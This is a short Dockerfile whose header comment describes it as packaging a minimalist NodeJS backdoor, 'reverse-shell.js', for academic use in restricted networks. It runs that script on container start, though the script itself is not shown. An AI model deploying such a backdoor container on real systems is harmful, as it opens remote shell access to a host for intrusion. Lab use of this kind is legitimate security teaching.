# NODEJS BACKDOOR IMAGE
# ---------------------
# This Dockerfile allows to build an image that contains the minimalist
# NodeJS backdoor "reverse-shell.js". 
# Do NOT run this image in production environments, it must only be used 
# for academic purposes in restricted networks.

FROM node:10

WORKDIR /home/node

COPY . /home/node

CMD ["node", "reverse-shell.js"]
